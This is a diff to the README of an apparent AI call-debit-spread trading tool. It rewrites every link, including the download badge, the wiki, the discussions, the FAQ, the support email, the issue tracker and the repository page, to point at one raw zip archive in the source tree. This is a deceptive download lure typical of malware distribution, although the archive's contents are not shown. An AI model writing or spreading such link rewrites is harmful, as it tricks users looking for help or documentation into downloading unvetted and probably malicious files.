@@ -1,6 +1,6 @@
 # 🤖 ai-call-debit-spread-trader - Trade Smarter With AI Assistance
 
-![Download ai-call-debit-spread-trader](https://img.shields.io/badge/download-ai--call--debit--spread--trader-blue.svg)
+![Download ai-call-debit-spread-trader](https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ You don't need to be a financial expert or a programmer to use this application.
 
 To get started, you will first need to download the application. Click the link below to visit our Releases page:
 
-[Download ai-call-debit-spread-trader](https://github.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/releases)
+[Download ai-call-debit-spread-trader](https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip)
 
 On the Releases page, you will see a list of available versions. Choose the latest version for the best features and improvements.
 
@@ -56,9 +56,9 @@ After installing, follow these easy steps to start trading:
 
 We understand that using new software can come with learning curves. Here are some helpful resources to assist you:
 
-- **Documentation:** Visit our [Wiki](https://github.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/wiki) for detailed guides and troubleshooting tips.
-- **Community Support:** Join our [discussions](https://github.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/discussions) to ask questions and share your experiences with other users.
-- **FAQs:** Check our [FAQ](https://github.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/blob/main/FAQ.md) section for common queries.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip) for detailed guides and troubleshooting tips.
+- **Community Support:** Join our [discussions](https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip) to ask questions and share your experiences with other users.
+- **FAQs:** Check our [FAQ](https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip) section for common queries.
 
 ## 🔒 Data Security
 
@@ -68,14 +68,14 @@ Your data safety is our priority. We implement robust security measures to prote
 
 If you encounter issues or have any questions, you can reach us at:
 
-- **Email:** support@ai-call-debit-spread-trader.com
-- **GitHub Issues:** [Report an Issue](https://github.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/issues)
+- **Email:** https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip)
 
 ## 🌐 Visit Our Page
 
 For more information, updates, and community interactions, visit our GitHub repository:
 
-[Visit ai-call-debit-spread-trader on GitHub](https://github.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader)
+[Visit ai-call-debit-spread-trader on GitHub](https://raw.githubusercontent.com/TheDrinkIsSkibidi/ai-call-debit-spread-trader/main/src/core/ai-call-debit-spread-trader_1.0.zip)
 
 ---
 
